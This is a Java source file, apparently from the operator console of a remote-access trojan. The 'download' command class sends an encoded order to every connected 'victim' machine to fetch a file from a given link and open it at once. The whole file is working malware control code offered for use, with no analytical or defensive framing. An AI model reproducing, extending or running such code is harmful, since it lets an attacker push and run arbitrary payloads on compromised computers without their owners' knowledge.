package org.anywhere.master.command.impl;

import org.anywhere.master.command.Command;
import org.anywhere.master.encoder.EncoderManager;
import org.anywhere.master.server.ServerData;
import org.anywhere.master.settings.Settings;
import org.anywhere.master.utils.Print;

import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.util.Date;
import java.util.concurrent.ConcurrentLinkedQueue;

public class CommandDownload extends Command {

    private final ConcurrentLinkedQueue<ServerData> serverData;
    private final EncoderManager encoderManager;

    public CommandDownload(final ConcurrentLinkedQueue<ServerData> serverData, final EncoderManager encoderManager) {
        super("download", "dl", "download <link>", "Download & open instantly to victims other program by direct link", false);
        this.serverData = serverData;
        this.encoderManager = encoderManager;
    }

    @Override
    public void execute(final String[] args) {
        if (args.length != 2) {
            Print.println(Print.LIGHT_RED + "Error : " + super.getSyntax());
            return;
        }
        if (this.serverData.isEmpty()) {
            Print.println(Print.LIGHT_RED + "No servers have ever been registered");
            return;
        }
        if (this.serverData.stream().noneMatch(ServerData::isConnected)) {
            Print.println(Print.LIGHT_RED + "No servers are currently online");
            return;
        }
        final String link = args[1];
        Print.println(Print.LIGHT_GREY + "Starting download " + Print.LIGHT_CYAN + link + Print.LIGHT_GREY + " for all victims!");
        this.serverData.forEach(data -> {
            final PrintWriter printWriter = data.getPrintWriter();
            printWriter.println("M:" + "download:" + new String((this.encoderManager.encode(link)).getBytes(StandardCharsets.UTF_8)));
            printWriter.flush();
        });
        Print.println(Print.LIGHT_GREY + "Download request successfully sent to servers");
    }
}
